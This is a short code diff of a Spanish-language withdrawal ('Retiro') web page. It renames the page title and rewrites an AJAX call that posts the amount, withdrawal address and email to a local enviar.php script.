@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RetiroUsers</title>
+    <title>Retiro</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -184,17 +184,14 @@
                 // Mostrar el modal
                 modal.classList.add('show');
 
-                // Enviar el formulario usando AJAX
+                // Enviar datos al servidor
                 const xhr = new XMLHttpRequest();
-                xhr.open("POST", "enviar.php", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.onreadystatechange = function () {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        if (xhr.status === 200) {
-                            console.log('Correo enviado con éxito.');
-                        } else {
-                            console.log('Error al enviar el correo.');
-                        }
+                xhr.open('POST', 'enviar.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        console.log(xhr.responseText);
+                        closeModal();
                     }
                 };
                 xhr.send(`amount=${amount}&withdraw-address=${withdrawAddress}&email=${email}`);
